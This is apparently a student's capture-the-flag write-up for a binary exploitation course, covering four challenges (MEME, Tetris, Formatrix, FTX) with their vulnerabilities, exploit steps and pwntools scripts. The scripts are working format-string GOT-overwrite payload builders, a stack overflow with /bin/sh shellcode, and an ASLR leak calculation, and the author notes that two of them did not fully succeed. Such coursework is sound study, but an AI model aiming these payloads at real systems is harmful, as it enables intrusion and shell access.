MEME
===========================

General overview of problems faced
-------------------------------------
Apart from understanding how format strings work, nothing in particular.

List of vulnerabilities
--------------------
- printf prints value of fgets (user input) without appropriate input sanitisation, allowing for arbitrary read and writes

Steps to exploit
------------------
- Identify offset by spamming b'AAAABBBB %p' and identifying when 'COMP6447' begins
- Construct format string payload that overwrites value in register found in previous step with desired value `2tRiViAl`

Script/Command used
------------------
```python

def exploit():
    P.recvuntil(b'at ')
    address = int(P.recvline().strip(), 16)
    log.info(f"address: {p64(address)}")

    P.recvuntil(b'Speak the phrase `')
    phrase = P.recvuntil(b'`')[:-1]
    log.info(f"Target value: {phrase}")

    P.recvuntil(b':')

    payload = b""
    written = 0

    writes = [(byte, i) for i, byte in enumerate(phrase)]
    writes.sort(key=lambda x: x[0])

    for idx, (byte, i) in enumerate(writes):
        to_write = (byte - (written)) % 0x100
        if to_write > 0:
            payload += f"%{to_write}c".encode()
            written += to_write
        # 8 corresponds to the offset until the buffer starts
        # add 11 to account for the length of the payload until the addresses
        payload += f"%{8 + 11 + idx}$hhn".encode() 

    padding_length = (8 - (len(payload) % 8)) % 8
    if padding_length:
        payload += b'A' * padding_length 

    for _, i in writes:
        payload += p64(address + i)

    P.sendline(payload)

    log.info(f"payload: {payload}")
    P.interactive()

```


Tetris
===========================

General overview of problems faced
-------------------------------------
Made my brain hurt trying to bypass the null checks in the shellcode (especially clearing the `rax` register). It was also not immediately obvious how to get an address to jump to for the shellcode to run.

List of vulnerabilities
--------------------
- executable stack frame
- set_name() allocates name 0x26 (38) characters but reads up to 70 characters (extra 32 characters)
- Vulnerability in password check allows arbitrary read of address of password variable
    - reads 0x63 (99) bytes for password, password length of 0x54 (84) is accepted


Steps to exploit
------------------
- Construct shellcode exploit which will be stored in the password buffer. This buffer must be padded to 83 characters (plus an additional 84th null byte) to allow for a stack pointer to be revealed. Additionally, shellcode must be cleared of null bytes since fgets will terminate before 
- Identify return address offset in set_name using cyclic (48) and construct a buffer overflow exploit which overwrites RIP with the stack pointer found in the previous step. 

Script/Command used
------------------
```python

def runner(send):
    P.recvuntil(b'[q]uit', drop=True)
    if(send in ['s', 'v', 'p', 'c', 'q']):
        P.sendline(send.encode())

shellcode = asm(
    "push 0x68\n"                 
    "mov rax, 0x68732f2f6e69622f\n"  
    "push rax\n"                  
    "mov rdi, rsp\n"              
    "xor esi, esi\n"              
    "push rsi\n"                  
    "mov rsi, rsp\n"              
    "xor edx, edx\n"              
    "push 0x3b\n"                 
    "pop rax\n"                   
    "syscall\n"                   
)

context.arch = "amd64"
shellcode = asm(shellcraft.amd64.linux.sh())


def set_name():
    runner('s')
    offset_from_rbp = 48 # found using cyclic
    payload = b'A' * offset_from_rbp + p64(0x0) + p64(STACK_POINTER)
    log.info(f"Sending payload of length {len(payload)}: {payload}")
    P.sendline(payload)

def enter_password():
    global STACK_POINTER
    runner('p')
    P.recvline()
    filler = b'\x90'
    n_filler = 0x54 - len(shellcode) - 1
    payload = filler * n_filler + shellcode
    log.info(f"Sending payload of length {len(payload)}: {payload}")
    P.sendline(payload)
    P.recvuntil(b'offset ', drop=True)
    STACK_POINTER = int(P.recvline()[:-1], 16)
    log.info("Stack pointer: %x" % (STACK_POINTER))
    
def exploit():
    connect_binary()
    enter_password()
    set_name()
    P.interactive()

```


Formatrix
===========================

General overview of problems faced
-------------------------------------
Unclear why printf does not redirect to win function.

List of vulnerabilities
--------------------
-  The first argument of sprintf is used as both the format string and the argument to sprintf. User controls buffer
and can inject arbitary format specifiers to leak stack information and overwrite memory addresses.

Steps to exploit
------------------
- Collect printf GOT address from decompiler and construct payload using similar format to MEME to overwrite GOT address to the address of WIN function.

Script/Command used
------------------
```python

def build_format_string(target, goal, start_byte=1, max_write=8):
    WRAP = 0x100

    bytes_list = [(goal >> (8 * i)) & 0xff for i in range(max_write)]
    writes = [(byte_value, index) for index, byte_value in enumerate(bytes_list)]
    writes.sort(key=lambda x: x[0])

    payload = b''
    written = 0 

    for idx, (byte_value, i) in enumerate(writes):
        to_write = (byte_value - written) % WRAP
        if to_write > 0:
            payload += f"%{to_write}c".encode()
            written += to_write
        param_index = start_byte + idx
        payload += f"%{param_index}$hhn".encode()

    padding = b'A' * ((8 - (len(payload) % 8)) % 8)
    payload += padding

    for _, i in writes:
        payload += p64(target + i)

    return payload

def connect_binary():
    global P, E, TARGET, WIN
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

        E = ELF(f"{__file__.replace('_sol.py', '')}")
    
        TARGET = E.got['printf']
        WIN = E.symbols['win']              # 0x 00 40 11 d6

def say(payload):
    P.recvuntil(b"You say:")
    P.sendline(payload)

def exploit():
    offset = 5 # find_offset(b"You say:")
    log.info(f"Using offset: {offset}")

    connect_binary()
    
    log.info(f"TARGET function address: {hex(TARGET)}")
    log.info(f"WIN function address: {hex(WIN)}")

    payload = build_format_string(TARGET, WIN, start_byte=offset+9) # add 9 to account for the initial input of the buffer before addresses
    say(payload)
    
    log.info(f"Payload sent: {payload}")
    P.interactive()

def find_offset(after = b':', option = 1):
    for i in range(1, 20):
        connect_binary()

        if option == 1:
            P.sendlineafter(after, f'AAAA%{i}$x'.encode())
            output = P.recvline(timeout=0.5).strip().decode('utf-8')
        else:
            P.sendlineafter(after, 'AAAABBBB %{}$p'.format(i)) # replace %x with %s to find the actual values
            P.recvuntil('AAAABBBB ')
            print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode('utf-8')))

        context.log_level = 'error'
        P.close()
        context.log_level = 'info'

        if option == 1 and '41414141' in output:
            return i

```

FTX
===========================

General overview of problems faced
-------------------------------------
Unable to redirect target address to win address for a similar issue as observed in formatrix (or at least I believe so).

List of vulnerabilities
--------------------
- change_handle() constructs a format string based on user input -> allows arbitrary reads and writes
- value of name is printed when gamble is won

Steps to exploit
------------------
- Find offset at which buffer begins by injecting %p into user handle (ensuring it is not space separated)
- Run gamble function and select number that is not a fibonacci number
- Using the buffer offset, construct a format string that overwrites printf GOT to redirect to win function. This requires calculation of the base offset to defeat ASLR (using the buffer address found). 
- Change handle to format string and run gamble function again to process format string and gain shell access.

Script/Command used
------------------
```python

def build_format_string(target, goal, start_byte=1, max_write=8):
    WRAP = 0x100

    bytes_list = [(goal >> (8 * i)) & 0xff for i in range(max_write)]
    writes = [(byte_value, index) for index, byte_value in enumerate(bytes_list)]
    writes.sort(key=lambda x: x[0])

    payload = b''
    written = 0 

    for idx, (byte_value, i) in enumerate(writes):
        to_write = (byte_value - written) % WRAP
        if to_write > 0:
            payload += f"%{to_write}c".encode()
            written += to_write
        param_index = start_byte + idx
        payload += f"%{param_index}$hhn".encode()

    padding = b'A' * ((8 - (len(payload) % 8)) % 8)
    payload += padding

    for _, i in writes:
        payload += p64(target + i)

    return payload

def is_perfect_square(n):
    if n < 0:
        return False
    root = int(math.isqrt(n))
    return root * root == n

def is_fibonacci(n):
    n = int(n)
    return is_perfect_square(5 * n * n + 4) or is_perfect_square(5 * n * n - 4)

def gamble():
    P.recvuntil(b': ', drop=True)
    P.sendline(b"1")  # Send the amount to gamble

    P.recvuntil(b'1) ', drop=True)
    one = int(P.recvline().strip())  
    log.info(f'[1] : {one}')

    P.recvuntil(b'2) ', drop=True)
    two = int(P.recvline().strip())  
    log.info(f'[2] : {two}')

    P.recvuntil(b'3) ', drop=True)
    three = int(P.recvline().strip()) 
    log.info(f'[3] : {three}')

    P.recvuntil(b'4) ', drop=True)
    four = int(P.recvline().strip()) 
    log.info(f'[4] : {four}')

    P.recvuntil(b'5) ', drop=True)
    five = int(P.recvline().strip()) 
    log.info(f'[5] : {five}')
    
    if not is_fibonacci(one):
        P.sendline(b"1")
        log.info(f'Selected [1] : {one}')
    elif not is_fibonacci(two):
        P.sendline(b"2")
        log.info(f'Selected [1] : {two}')
    elif not is_fibonacci(three):
        P.sendline(b"3")
        log.info(f'Selected [3] : {three}')
    elif not is_fibonacci(four):
        P.sendline(b"4")
        log.info(f'Selected [4] : {four}')
    else:
        P.sendline(b"5")
        log.info(f'Selected [5] : {five}')
   
def exploit():
    payload = b'%8$p' # stores buffer
    P.sendlineafter(b'?\n', payload)
    P.sendlineafter(b'What will you do?\n', b'g')
    
    gamble()

    leak = P.recvuntil(b'!',drop=True)[14:]
    log.info(f"Leaked: {leak}")
    P.recvuntil(b'continue...\n', drop=True)

    base = int(leak, 16) - 0xd8 - 0x1e08        # try 0xd8 or 459
    win = base + 0x1219                         # win function
    target = base + 0x4258                      # printf GOT

    log.info(f"TARGET function address: {hex(target)}")
    log.info(f"WIN function address: {hex(win)}")

    payload = build_format_string(target, win, start_byte=5 + 9) # 9 bytes corresponds to initial length of payload before addresses are read
    log.info(f"Payload: {payload}")
    
    P.sendline()
    P.sendlineafter(b'What will you do?\n', b'c')
    P.sendlineafter(b'handle?\n', payload)
    P.sendlineafter(b'What will you do?\n', b'g')

    gamble()

    P.interactive()
    
if __name__ == '__main__':
    connect_binary()
    exploit()

```